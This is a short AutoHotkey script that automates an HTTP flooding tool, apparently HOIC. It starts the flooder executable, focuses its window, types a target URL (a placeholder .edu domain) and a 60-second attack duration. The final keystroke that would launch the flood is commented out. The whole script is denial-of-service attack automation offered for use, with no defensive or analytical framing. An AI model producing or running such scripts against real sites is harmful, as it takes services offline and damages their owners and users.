#CommentFlag //

// ------------------------------------------------
// CONFIG
// ------------------------------------------------

httpflooder_path = C:\Temp\HTTPFlooder.exe
target_url = www.example.edu
attack_duration = 60 // in seconds

// ------------------------------------------------
// MAIN SCRIPT
// ------------------------------------------------

// Execute HOIC
Run, %httpflooder_path%

// Give focus to HOIC window
WinActivate, %httpflooder_path%
WinWaitActive, %httpflooder_path%

// Target
SendInput %target_url%
Send {Enter}

// Duration
SendInput %attack_duration%

// Execute attack
//Send {Enter}